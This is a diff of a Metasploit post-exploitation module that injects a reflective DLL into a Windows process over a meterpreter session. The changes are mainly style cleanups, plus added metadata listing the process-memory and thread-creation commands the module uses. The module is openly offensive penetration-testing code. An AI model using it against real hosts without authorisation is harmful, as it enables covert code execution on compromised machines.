@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Priv
@@ -11,24 +10,45 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::ReflectiveDLLInjection
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'Windows Manage Reflective DLL Injection Module',
-      'Description' => %q{
-        This module will inject a specified reflective DLL into the memory of a
-        process, new or existing. If arguments are specified, they are passed to
-        the DllMain entry point as the lpvReserved (3rd) parameter. To read
-        output from the injected process, set PID to zero and WAIT to non-zero.
-        Make sure the architecture of the DLL matches the target process.
-      },
-      'License'      => MSF_LICENSE,
-      'Author'       => ['Ben Campbell', 'b4rtik'],
-      'Platform'     => 'win',
-      'SessionTypes' => ['meterpreter'],
-      'References'   =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Reflective DLL Injection Module',
+        'Description' => %q{
+          This module will inject a specified reflective DLL into the memory of a
+          process, new or existing. If arguments are specified, they are passed to
+          the DllMain entry point as the lpvReserved (3rd) parameter. To read
+          output from the injected process, set PID to zero and WAIT to non-zero.
+          Make sure the architecture of the DLL matches the target process.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Ben Campbell', 'b4rtik'],
+        'Platform' => 'win',
+        'SessionTypes' => ['meterpreter'],
+        'References' => [
           [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
-        ]
-    ))
+        ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_process_attach
+              stdapi_sys_process_execute
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_kill
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_write
+              stdapi_sys_process_thread_create
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
     register_options(
       [
         OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process']),
@@ -36,7 +56,7 @@ class MetasploitModule < Msf::Post
         OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
         OptInt.new('WAIT', [false, 'Time in seconds to wait before reading output', 0])
-      ], self.class
+      ]
     )
 
     register_advanced_options(
@@ -64,12 +84,12 @@ class MetasploitModule < Msf::Post
     end
 
     host_processes = client.sys.process.get_processes
-    if host_processes.length < 1
-      print_bad("No running processes found on the target host.")
+    if host_processes.empty?
+      print_bad('No running processes found on the target host.')
       return false
     end
 
-    theprocess = host_processes.find {|x| x["pid"] == pid}
+    theprocess = host_processes.find { |x| x['pid'] == pid }
 
     !theprocess.nil?
   end
@@ -114,8 +134,10 @@ class MetasploitModule < Msf::Post
   end
 
   def run_dll(dll_path)
-    print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?
-    if datastore['PID'] > 0 or datastore['WAIT'] == 0
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
+
+    if (datastore['PID'] > 0) || (datastore['WAIT'] == 0)
       print_warning('Output unavailable')
     end
 
@@ -126,7 +148,7 @@ class MetasploitModule < Msf::Post
     end
 
     if hprocess.nil?
-      print_bad("Execution finished")
+      print_bad('Execution finished')
       return
     end
 
@@ -145,7 +167,7 @@ class MetasploitModule < Msf::Post
       sleep(datastore['WAIT'])
     end
 
-    if datastore['PID'] <= 0 and datastore['WAIT'] != 0
+    if (datastore['PID'] <= 0) && (datastore['WAIT'] != 0)
       read_output(process)
     end
 
@@ -175,15 +197,15 @@ class MetasploitModule < Msf::Post
     begin
       loop do
         output = process.channel.read
-        if !output.nil? and output.length > 0
+        if !output.nil? && !output.empty?
           output.split("\n").each { |x| print_good(x) }
         end
-        break if output.nil? or output.length == 0
+        break if output.nil? || output.empty?
       end
-    rescue Rex::TimeoutError => e
-      vprint_warning("Time out exception: wait limit exceeded (5 sec)")
-    rescue ::Exception => e
-      print_error("Exception: #{e.inspect}")
+    rescue Rex::TimeoutError
+      vprint_warning('Time out exception: wait limit exceeded (5 sec)')
+    rescue StandardError => e
+      print_error("Error: #{e.inspect}")
     end
 
     client.response_timeout = old_timeout
